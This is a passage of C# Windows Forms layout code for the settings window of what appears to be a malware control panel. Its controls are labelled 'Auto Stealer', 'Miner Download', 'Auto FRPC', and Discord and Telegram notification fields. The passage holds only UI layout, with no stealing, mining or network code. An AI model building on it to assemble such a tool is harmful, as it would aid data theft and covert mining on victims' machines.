		this.checkBox3.ForeColor = System.Drawing.Color.Black;
		this.checkBox3.Location = new System.Drawing.Point(317, 129);
		this.checkBox3.Name = "checkBox3";
		this.checkBox3.Size = new System.Drawing.Size(62, 17);
		this.checkBox3.TabIndex = 66;
		this.checkBox3.Text = "Sounds";
		this.checkBox3.UseVisualStyleBackColor = true;
		this.checkBox2.AutoSize = true;
		this.checkBox2.ForeColor = System.Drawing.Color.Black;
		this.checkBox2.Location = new System.Drawing.Point(317, 168);
		this.checkBox2.Name = "checkBox2";
		this.checkBox2.Size = new System.Drawing.Size(84, 17);
		this.checkBox2.TabIndex = 7;
		this.checkBox2.Text = "Auto Stealer";
		this.checkBox2.UseVisualStyleBackColor = true;
		this.materialLabel3.AutoSize = true;
		this.materialLabel3.Depth = 0;
		this.materialLabel3.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel3.Location = new System.Drawing.Point(193, 68);
		this.materialLabel3.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel3.Name = "materialLabel3";
		this.materialLabel3.Size = new System.Drawing.Size(116, 19);
		this.materialLabel3.TabIndex = 6;
		this.materialLabel3.Text = "Ping Disconnect";
		this.numericUpDown1.Location = new System.Drawing.Point(315, 67);
		this.numericUpDown1.Name = "numericUpDown1";
		this.numericUpDown1.Size = new System.Drawing.Size(62, 20);
		this.numericUpDown1.TabIndex = 5;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Font = new System.Drawing.Font("Cambria", 14.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.materialLabel1.ForeColor = System.Drawing.Color.Black;
		this.materialLabel1.Location = new System.Drawing.Point(12, 102);
		this.materialLabel1.MaximumSize = new System.Drawing.Size(270, 0);
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(134, 22);
		this.materialLabel1.TabIndex = 4;
		this.materialLabel1.Text = "Status: [offline]";
		this.materialLabel2.AutoSize = true;
		this.materialLabel2.Depth = 0;
		this.materialLabel2.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel2.Location = new System.Drawing.Point(13, 166);
		this.materialLabel2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel2.Name = "materialLabel2";
		this.materialLabel2.Size = new System.Drawing.Size(160, 19);
		this.materialLabel2.TabIndex = 3;
		this.materialLabel2.Text = "Certificate: [Not Exists]";
		this.groupBox2.BackColor = System.Drawing.Color.White;
		this.groupBox2.Controls.Add(this.materialSwitch2);
		this.groupBox2.Controls.Add(this.materialSwitch1);
		this.groupBox2.Controls.Add(this.rjTextBox2);
		this.groupBox2.ForeColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.groupBox2.Location = new System.Drawing.Point(15, 282);
		this.groupBox2.Name = "groupBox2";
		this.groupBox2.Size = new System.Drawing.Size(407, 109);
		this.groupBox2.TabIndex = 7;
		this.groupBox2.TabStop = false;
		this.groupBox2.Text = "Discord Notificator";
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Location = new System.Drawing.Point(196, 59);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(116, 37);
		this.materialSwitch2.TabIndex = 63;
		this.materialSwitch2.Text = "Connect";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Location = new System.Drawing.Point(16, 59);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(151, 37);
		this.materialSwitch1.TabIndex = 62;
		this.materialSwitch1.Text = "New Connect";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.rjTextBox2.BackColor = System.Drawing.Color.White;
		this.rjTextBox2.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox2.BorderFocusColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox2.BorderRadius = 0;
		this.rjTextBox2.BorderSize = 2;
		this.rjTextBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox2.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox2.Location = new System.Drawing.Point(16, 20);
		this.rjTextBox2.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox2.Multiline = false;
		this.rjTextBox2.Name = "rjTextBox2";
		this.rjTextBox2.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox2.PasswordChar = false;
		this.rjTextBox2.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox2.PlaceholderText = "Webhook";
		this.rjTextBox2.Size = new System.Drawing.Size(384, 31);
		this.rjTextBox2.TabIndex = 0;
		this.rjTextBox2.Texts = "";
		this.rjTextBox2.UnderlinedStyle = false;
		this.groupBox3.BackColor = System.Drawing.Color.White;
		this.groupBox3.Controls.Add(this.rjTextBox3);
		this.groupBox3.ForeColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.groupBox3.Location = new System.Drawing.Point(15, 397);
		this.groupBox3.Name = "groupBox3";
		this.groupBox3.Size = new System.Drawing.Size(407, 65);
		this.groupBox3.TabIndex = 64;
		this.groupBox3.TabStop = false;
		this.groupBox3.Text = "Miner Download";
		this.rjTextBox3.BackColor = System.Drawing.Color.White;
		this.rjTextBox3.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox3.BorderFocusColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox3.BorderRadius = 0;
		this.rjTextBox3.BorderSize = 2;
		this.rjTextBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox3.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox3.Location = new System.Drawing.Point(16, 20);
		this.rjTextBox3.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox3.Multiline = false;
		this.rjTextBox3.Name = "rjTextBox3";
		this.rjTextBox3.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox3.PasswordChar = false;
		this.rjTextBox3.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox3.PlaceholderText = "url";
		this.rjTextBox3.Size = new System.Drawing.Size(384, 31);
		this.rjTextBox3.TabIndex = 0;
		this.rjTextBox3.Texts = "";
		this.rjTextBox3.UnderlinedStyle = false;
		this.groupBox4.BackColor = System.Drawing.Color.White;
		this.groupBox4.Controls.Add(this.materialSwitch6);
		this.groupBox4.Controls.Add(this.materialSwitch5);
		this.groupBox4.Controls.Add(this.materialLabel5);
		this.groupBox4.Controls.Add(this.rjComboBox2);
		this.groupBox4.Controls.Add(this.materialLabel4);
		this.groupBox4.Controls.Add(this.rjComboBox1);
		this.groupBox4.ForeColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.groupBox4.Location = new System.Drawing.Point(428, 67);
		this.groupBox4.Name = "groupBox4";
		this.groupBox4.Size = new System.Drawing.Size(407, 200);
		this.groupBox4.TabIndex = 65;
		this.groupBox4.TabStop = false;
		this.groupBox4.Text = "Panel";
		this.materialSwitch6.AutoSize = true;
		this.materialSwitch6.Depth = 0;
		this.materialSwitch6.Location = new System.Drawing.Point(215, 148);
		this.materialSwitch6.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch6.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch6.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch6.Name = "materialSwitch6";
		this.materialSwitch6.Ripple = true;
		this.materialSwitch6.Size = new System.Drawing.Size(175, 37);
		this.materialSwitch6.TabIndex = 64;
		this.materialSwitch6.Text = "SpeedUP Theme";
		this.materialSwitch6.UseVisualStyleBackColor = true;
		this.materialSwitch5.AutoSize = true;
		this.materialSwitch5.Depth = 0;
		this.materialSwitch5.Location = new System.Drawing.Point(19, 146);
		this.materialSwitch5.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch5.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch5.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch5.Name = "materialSwitch5";
		this.materialSwitch5.Ripple = true;
		this.materialSwitch5.Size = new System.Drawing.Size(173, 37);
		this.materialSwitch5.TabIndex = 63;
		this.materialSwitch5.Text = "Rainbow Theme";
		this.materialSwitch5.UseVisualStyleBackColor = true;
		this.materialLabel5.AutoSize = true;
		this.materialLabel5.Depth = 0;
		this.materialLabel5.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel5.Location = new System.Drawing.Point(16, 77);
		this.materialLabel5.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel5.Name = "materialLabel5";
		this.materialLabel5.Size = new System.Drawing.Size(50, 19);
		this.materialLabel5.TabIndex = 9;
		this.materialLabel5.Text = "Theme";
		this.rjComboBox2.BackColor = System.Drawing.Color.WhiteSmoke;
		this.rjComboBox2.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjComboBox2.BorderSize = 1;
		this.rjComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox2.ForeColor = System.Drawing.Color.Black;
		this.rjComboBox2.IconColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjComboBox2.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox2.ListTextColor = System.Drawing.Color.Black;
		this.rjComboBox2.Location = new System.Drawing.Point(19, 102);
		this.rjComboBox2.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox2.Name = "rjComboBox2";
		this.rjComboBox2.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox2.Size = new System.Drawing.Size(371, 30);
		this.rjComboBox2.TabIndex = 10;
		this.rjComboBox2.Texts = "";
		this.rjComboBox2.OnSelectedIndexChanged += new System.EventHandler(rjComboBox2_OnSelectedIndexChanged);
		this.materialLabel4.AutoSize = true;
		this.materialLabel4.Depth = 0;
		this.materialLabel4.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel4.Location = new System.Drawing.Point(16, 20);
		this.materialLabel4.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel4.Name = "materialLabel4";
		this.materialLabel4.Size = new System.Drawing.Size(36, 19);
		this.materialLabel4.TabIndex = 7;
		this.materialLabel4.Text = "Style";
		this.rjComboBox1.BackColor = System.Drawing.Color.WhiteSmoke;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.Black;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjComboBox1.Items.AddRange(new object[29]
		{
			"Royal Violet", "Deep Ocean", "Mogged Red", "Matrix Green", "Solar Flare", "Sunlight", "Dark Sorcery", "Cyber Swamp", "Cryo Core", "Aqua Neon",
			"Acid Lime", "Indigo Sky", "Inferno Burn", "Golden Dust", "Bubblegum", "Fresh Leaf", "Mocha Brown", "Steel Grey", "Magenta Dream", "Electric Pink",
			"Emerald Haze", "Carrot Orange", "Royal Indigo", "Sky Blue", "Firebrick Red", "Onyx", "Arctic White", "Smoke Grey", "Black"
		});
		this.rjComboBox1.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.Black;
		this.rjComboBox1.Location = new System.Drawing.Point(19, 45);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(371, 30);
		this.rjComboBox1.TabIndex = 8;
		this.rjComboBox1.Texts = "";
		this.rjComboBox1.OnSelectedIndexChanged += new System.EventHandler(rjComboBox1_OnSelectedIndexChanged);
		this.groupBox5.BackColor = System.Drawing.Color.White;
		this.groupBox5.Controls.Add(this.rjButton2);
		this.groupBox5.Controls.Add(this.rjTextBox5);
		this.groupBox5.Controls.Add(this.materialSwitch3);
		this.groupBox5.Controls.Add(this.materialSwitch4);
		this.groupBox5.Controls.Add(this.rjTextBox4);
		this.groupBox5.ForeColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.groupBox5.Location = new System.Drawing.Point(428, 282);
		this.groupBox5.Name = "groupBox5";
		this.groupBox5.Size = new System.Drawing.Size(407, 180);
		this.groupBox5.TabIndex = 66;
		this.groupBox5.TabStop = false;
		this.groupBox5.Text = "Telegram Notificator";
		this.rjButton2.BackColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton2.BackgroundColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton2.BorderColor = System.Drawing.Color.DarkViolet;
		this.rjButton2.BorderRadius = 0;
		this.rjButton2.BorderSize = 0;
		this.rjButton2.FlatAppearance.BorderSize = 0;
		this.rjButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton2.ForeColor = System.Drawing.Color.White;
		this.rjButton2.Location = new System.Drawing.Point(16, 96);
		this.rjButton2.Name = "rjButton2";
		this.rjButton2.Size = new System.Drawing.Size(385, 29);
		this.rjButton2.TabIndex = 65;
		this.rjButton2.Text = "Check Working";
		this.rjButton2.TextColor = System.Drawing.Color.White;
		this.rjButton2.UseVisualStyleBackColor = false;
		this.rjTextBox5.BackColor = System.Drawing.Color.White;
		this.rjTextBox5.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox5.BorderFocusColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox5.BorderRadius = 0;
		this.rjTextBox5.BorderSize = 2;
		this.rjTextBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox5.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox5.Location = new System.Drawing.Point(16, 59);
		this.rjTextBox5.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox5.Multiline = false;
		this.rjTextBox5.Name = "rjTextBox5";
		this.rjTextBox5.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox5.PasswordChar = false;
		this.rjTextBox5.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox5.PlaceholderText = "ChatID";
		this.rjTextBox5.Size = new System.Drawing.Size(384, 31);
		this.rjTextBox5.TabIndex = 64;
		this.rjTextBox5.Texts = "";
		this.rjTextBox5.UnderlinedStyle = false;
		this.materialSwitch3.AutoSize = true;
		this.materialSwitch3.Depth = 0;
		this.materialSwitch3.Location = new System.Drawing.Point(194, 129);
		this.materialSwitch3.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch3.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch3.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch3.Name = "materialSwitch3";
		this.materialSwitch3.Ripple = true;
		this.materialSwitch3.Size = new System.Drawing.Size(116, 37);
		this.materialSwitch3.TabIndex = 63;
		this.materialSwitch3.Text = "Connect";
		this.materialSwitch3.UseVisualStyleBackColor = true;
		this.materialSwitch4.AutoSize = true;
		this.materialSwitch4.Depth = 0;
		this.materialSwitch4.Location = new System.Drawing.Point(16, 129);
		this.materialSwitch4.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch4.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch4.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch4.Name = "materialSwitch4";
		this.materialSwitch4.Ripple = true;
		this.materialSwitch4.Size = new System.Drawing.Size(151, 37);
		this.materialSwitch4.TabIndex = 62;
		this.materialSwitch4.Text = "New Connect";
		this.materialSwitch4.UseVisualStyleBackColor = true;
		this.rjTextBox4.BackColor = System.Drawing.Color.White;
		this.rjTextBox4.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox4.BorderFocusColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox4.BorderRadius = 0;
		this.rjTextBox4.BorderSize = 2;
		this.rjTextBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox4.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox4.Location = new System.Drawing.Point(16, 20);
		this.rjTextBox4.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox4.Multiline = false;
		this.rjTextBox4.Name = "rjTextBox4";
		this.rjTextBox4.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox4.PasswordChar = false;
		this.rjTextBox4.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox4.PlaceholderText = "BotToken";
		this.rjTextBox4.Size = new System.Drawing.Size(384, 31);
		this.rjTextBox4.TabIndex = 0;
		this.rjTextBox4.Texts = "";
		this.rjTextBox4.UnderlinedStyle = false;
		this.groupBox6.BackColor = System.Drawing.Color.White;
		this.groupBox6.Controls.Add(this.rjTextBox8);
		this.groupBox6.Controls.Add(this.rjComboBox3);
		this.groupBox6.Controls.Add(this.rjButton4);
		this.groupBox6.Controls.Add(this.rjButton3);
		this.groupBox6.Controls.Add(this.rjTextBox7);
		this.groupBox6.ForeColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.groupBox6.Location = new System.Drawing.Point(15, 468);
		this.groupBox6.Name = "groupBox6";
		this.groupBox6.Size = new System.Drawing.Size(820, 96);
		this.groupBox6.TabIndex = 67;
		this.groupBox6.TabStop = false;
		this.groupBox6.Text = "Form Text";
		this.rjTextBox8.BackColor = System.Drawing.Color.White;
		this.rjTextBox8.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox8.BorderFocusColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox8.BorderRadius = 0;
		this.rjTextBox8.BorderSize = 2;
		this.rjTextBox8.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox8.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox8.Location = new System.Drawing.Point(743, 20);
		this.rjTextBox8.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox8.Multiline = false;
		this.rjTextBox8.Name = "rjTextBox8";
		this.rjTextBox8.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox8.PasswordChar = false;
		this.rjTextBox8.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox8.PlaceholderText = "Speed (ms)";
		this.rjTextBox8.Size = new System.Drawing.Size(70, 31);
		this.rjTextBox8.TabIndex = 68;
		this.rjTextBox8.Texts = "80";
		this.rjTextBox8.UnderlinedStyle = false;
		this.rjComboBox3.Anchor = System.Windows.Forms.AnchorStyles.None;
		this.rjComboBox3.BackColor = System.Drawing.Color.WhiteSmoke;
		this.rjComboBox3.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjComboBox3.BorderSize = 1;
		this.rjComboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox3.ForeColor = System.Drawing.Color.Black;
		this.rjComboBox3.IconColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjComboBox3.Items.AddRange(new object[6] { "Typing (Default)", "Fade In/Out", "Slide Left/Right", "Wave", "Rainbow", "Static (No Animation)" });
		this.rjComboBox3.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox3.ListTextColor = System.Drawing.Color.Black;
		this.rjComboBox3.Location = new System.Drawing.Point(413, 19);
		this.rjComboBox3.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox3.Name = "rjComboBox3";
		this.rjComboBox3.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox3.Size = new System.Drawing.Size(323, 32);
		this.rjComboBox3.TabIndex = 67;
		this.rjComboBox3.Texts = "Typing (Default)";
		this.rjButton4.BackColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton4.BackgroundColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton4.BorderColor = System.Drawing.Color.DarkViolet;
		this.rjButton4.BorderRadius = 0;
		this.rjButton4.BorderSize = 0;
		this.rjButton4.FlatAppearance.BorderSize = 0;
		this.rjButton4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton4.ForeColor = System.Drawing.Color.White;
		this.rjButton4.Location = new System.Drawing.Point(413, 58);
		this.rjButton4.Name = "rjButton4";
		this.rjButton4.Size = new System.Drawing.Size(400, 29);
		this.rjButton4.TabIndex = 66;
		this.rjButton4.Text = "Reset Text";
		this.rjButton4.TextColor = System.Drawing.Color.White;
		this.rjButton4.UseVisualStyleBackColor = false;
		this.rjButton4.Click += new System.EventHandler(rjButton4_Click);
		this.rjButton3.BackColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton3.BackgroundColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjButton3.BorderColor = System.Drawing.Color.DarkViolet;
		this.rjButton3.BorderRadius = 0;
		this.rjButton3.BorderSize = 0;
		this.rjButton3.FlatAppearance.BorderSize = 0;
		this.rjButton3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton3.ForeColor = System.Drawing.Color.White;
		this.rjButton3.Location = new System.Drawing.Point(16, 58);
		this.rjButton3.Name = "rjButton3";
		this.rjButton3.Size = new System.Drawing.Size(391, 29);
		this.rjButton3.TabIndex = 65;
		this.rjButton3.Text = "Set Text";
		this.rjButton3.TextColor = System.Drawing.Color.White;
		this.rjButton3.UseVisualStyleBackColor = false;
		this.rjButton3.Click += new System.EventHandler(rjButton3_Click);
		this.rjTextBox7.BackColor = System.Drawing.Color.White;
		this.rjTextBox7.BorderColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox7.BorderFocusColor = System.Drawing.Color.FromArgb(3, 155, 229);
		this.rjTextBox7.BorderRadius = 0;
		this.rjTextBox7.BorderSize = 2;
		this.rjTextBox7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox7.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox7.Location = new System.Drawing.Point(16, 20);
		this.rjTextBox7.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox7.Multiline = false;
		this.rjTextBox7.Name = "rjTextBox7";
		this.rjTextBox7.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox7.PasswordChar = false;
		this.rjTextBox7.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox7.PlaceholderText = "Form text";
		this.rjTextBox7.Size = new System.Drawing.Size(391, 31);
		this.rjTextBox7.TabIndex = 0;
		this.rjTextBox7.Texts = "";
		this.rjTextBox7.UnderlinedStyle = false;
		this.checkBox7.AutoSize = true;
		this.checkBox7.ForeColor = System.Drawing.Color.Black;
		this.checkBox7.Location = new System.Drawing.Point(317, 108);
		this.checkBox7.Name = "checkBox7";
		this.checkBox7.Size = new System.Drawing.Size(79, 17);
		this.checkBox7.TabIndex = 71;
		this.checkBox7.Text = "Auto FRPC";
		this.checkBox7.UseVisualStyleBackColor = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(844, 569);
		base.Controls.Add(this.groupBox6);
		base.Controls.Add(this.groupBox5);
		base.Controls.Add(this.groupBox4);
		base.Controls.Add(this.groupBox3);
		base.Controls.Add(this.groupBox2);
		base.Controls.Add(this.groupBox1);
		base.Name = "FormSettings";
		this.Text = "Settings";
		base.Load += new System.EventHandler(FormSettings_Load);
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1).EndInit();
		this.groupBox2.ResumeLayout(false);
		this.groupBox2.PerformLayout();
		this.groupBox3.ResumeLayout(false);
		this.groupBox4.ResumeLayout(false);
		this.groupBox4.PerformLayout();
		this.groupBox5.ResumeLayout(false);
		this.groupBox5.PerformLayout();
		this.groupBox6.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
